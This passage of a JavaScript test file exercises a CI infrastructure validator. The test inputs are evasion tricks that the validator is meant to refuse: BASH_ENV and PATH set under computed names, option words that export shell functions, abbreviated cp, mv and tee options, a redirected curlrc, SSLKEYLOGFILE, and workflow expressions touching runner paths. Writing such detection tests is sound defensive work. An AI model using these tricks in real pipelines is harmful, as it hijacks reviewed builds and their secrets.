    "${{ github['env'] }}",
    '${{ toJSON(github) }}',
    '${{ format("{0}", github.env) }}',
  ])
    assert.ok(
      infra([wf(value)]).errors.some((e) => /names a runner file-command path/.test(e)),
      value,
    );
  for (const value of [
    '${{ github.sha }}',
    '${{ github.event_name }}',
    '${{ github.environment }}',
    '${{ runner.temp }}',
    '${{ secrets.github_token }}',
  ])
    assert.deepEqual(infra([wf(value)]).errors, [], value);
});

test('task 370 B2: a computed option word of set, export, declare, typeset and local may be -a or -f once expanded', () => {
  const child = scriptFile('scripts/x.sh', `${decl('IMAGE')}docker run "$IMAGE" true`);
  for (const parent of [
    'x=a; set -$x\nreadonly() { :; }\nbash scripts/x.sh',
    'o=allexport; set -o "$o"\nbash scripts/x.sh',
    'f=f; export -$f readonly\nbash scripts/x.sh',
    'f=fx; declare "-$f" readonly\nbash scripts/x.sh',
    'x=-fx; declare ${x} readonly\nbash scripts/x.sh',
    'o=-fx; typeset $o readonly\nbash scripts/x.sh',
    'f() { local $o readonly; }\nbash scripts/x.sh',
    'set +o "$o"\nbash scripts/x.sh',
    'set "$@"\nbash scripts/x.sh',
    'set -e `echo -a`\nbash scripts/x.sh',
    'export -n $o x\nbash scripts/x.sh',
  ])
    refusesShell(parent, /exports shell functions/, bare, [child]);
  // controls: a literal name, a word after --, literal options; a computed NAME before = is the next test's business
  for (const parent of [
    'export X=1 -- "$name"',
    'set -- "$@"',
    'set -eu',
    'export -- "$name"',
    'export Y="$2"',
    'declare -r X=1',
    'export "$1=$2"', // bash refuses `-…=` as an option cluster, so this word is no option (the name is next test's)
  ])
    if (!/\$1=\$2/.test(parent)) acceptsShell(parent, bare, [child]);
    else refusesShell(parent, /sets a variable under the name/, bare, [child]);
  // brace and glob words are option words too: `set -{a,}`, `export -{f,} g`, `set -[a]` with a file named -a
  for (const parent of [
    'set -{a,}',
    'set -o all{export,}',
    'export -{f,} g',
    'declare -{f,}x g',
    'export {-f,-n} g',
    'export -[f] g',
    'set -?',
    'typeset -{f,}x g',
  ])
    refusesShell(`${parent}\nbash scripts/x.sh`, /exports shell functions/, bare, [child]);
});

test('task 370 B1/B2: a variable set under a computed NAME may be BASH_ENV, PATH or HOME - refused unless a reviewed entry lists the word', () => {
  const child = scriptFile('scripts/x.sh', `${decl('IMAGE')}docker run "$IMAGE" true`);
  const named = /sets a variable under the name/;
  for (const parent of [
    'n=BASH_ENV; export "$n=/tmp/e"',
    'n=BASH_ENV; declare -x "$n=/tmp/e"',
    'n=BASH; export "${n}_ENV=/tmp/e"',
    'n=BASH; export "BASH_$n=/tmp/e"',
    'export "$1"="$2"',
    'n=PATH; export "$n=/tmp/bin:$PATH"',
    'n=PATH; printf -v "$n" %s /tmp/bin',
    'n=PATH; read -r "$n" <<< /tmp/bin',
    'n=PATH; declare "$n=/tmp/bin"',
    'n=PATH; readonly "$n=/tmp/bin"',
    'n=PATH; mapfile -t "$n" < /dev/null',
    'getopts a "$n"',
    'declare -n ref=PATH',
    'typeset -nx ref=HOME',
  ])
    refusesShell(`${parent}\nbash scripts/x.sh`, named, bare, [child]);
  // controls: a literal name is another rule's business (the word BASH_ENV is refused whole), a computed VALUE is fine
  acceptsShell(
    'export X="$1"\nread -r line < /dev/null\nprintf -v out %s "$1"\ngetopts "$spec" opt',
    bare,
    [child],
  );
  // a reviewed script lists the exact words (the loop over principals in ci-up.sh)
  const listed = {
    ...bare,
    reviewedPrograms: new Map([
      ['scripts/w.sh', { programs: [], assigns: ['$1=$2'], reason: 'r' }],
    ]),
  };
  assert.deepEqual(
    validateInfraImagePins([scriptFile('scripts/w.sh', 'export "$1=$2"')], listed).errors,
    [],
  );
  assert.ok(
    validateInfraImagePins([scriptFile('scripts/w.sh', 'export "$1=$3"')], listed).errors.length >
      0,
  );
  // an entry nothing uses any more is refused
  assert.ok(
    validateInfraImagePins([scriptFile('scripts/w.sh', 'true')], listed).errors.some((e) =>
      /lists the assignment \$1=\$2 in scripts\/w.sh, which nothing sets/.test(e),
    ),
  );
});

test('task 370 B3: cp, mv, ln, tee, touch and uniq have an exact allowlist of long options - GNU getopt takes abbreviations', () => {
  const lib = scriptFile('scripts/lib.sh');
  for (const body of [
    'cp --targ=scripts lib.sh', // the review's row: --target-directory=scripts
    'cp --target=scripts lib.sh',
    'cp --t=scripts lib.sh',
    'mv --t=scripts lib.sh',
    'ln -sf --tar=scripts /tmp/lib.sh',
    'cp --parents a b',
    'cp --preserve=all a b',
    'tee --output-error=exit scripts/lib.sh',
    'tee --app out',
    'touch --ref=a b',
    'uniq --count in out',
  ])
    refusesShell(`${body}\nbash scripts/lib.sh`, /option .* is not one this check reads/, bare, [
      lib,
    ]);
  // the exact spellings still name their target, and the allowed options pass
  refusesShell(
    'cp --target-directory=scripts lib.sh\nbash scripts/lib.sh',
    /writes into scripts/,
    bare,
    [lib],
  );
  acceptsShell(
    'cp --force --verbose a out/b\nmv -f --verbose a out/c\nln --symbolic --force a out/d\ntee --append out/e </dev/null\ncp -- a out/f',
    bare,
    [lib],
  );
  // curlrc through a computed path, across steps: the write is the unreadable one
  const wf = workflowYaml(
    stringify({
      jobs: {
        j: {
          steps: [
            { run: 'a=curl; echo \'output = "scripts/lib.sh"\' > "$HOME/.${a}rc"' },
            { run: 'curl -fsS https://x' },
          ],
        },
      },
    }),
  );
  assert.ok(infra([wf]).errors.some((e) => /writes to a path this check cannot read/.test(e)));
  // curl's configuration by variable (written as a word) and by file stays refused
  for (const body of [
    'curl -K "$cfg" https://x',
    'HOME=/tmp/h curl https://x',
    'XDG_CONFIG_HOME=/tmp curl https://x',
    'echo x > /tmp/.curlrc',
  ])
    refusesShell(body, /startup|not one this check reads/, bare, [lib]);
});

test('task 370 FU1 + FU2: only the plain shell #! lines are read as bash; SSLKEYLOGFILE is a file curl appends to', () => {
  for (const first of [
    '#!/bin/bash evil.txt',
    '#!/usr/bin/env python3',
    '#!/usr/bin/python3',
    '#!/usr/bin/env node',
    '#!/bin/bash -e',
    '#!/usr/bin/env bash -a',
    '#!/bin/zsh',
  ])
    refusesShell(`${first}\ntrue\n`, /#! line is not/);
  for (const first of [
    '#!/bin/bash',
    '#!/bin/sh',
    '#!/usr/bin/env bash',
    '#!/usr/bin/env sh',
    '#! /bin/bash ',
  ])
    acceptsShell(`${first}\ntrue\n`);
  refusesShell('SSLKEYLOGFILE=scripts/lib.sh curl -fsS https://x', /startup/);
  refusesShell('export SSLKEYLOGFILE=x', /startup/);
});
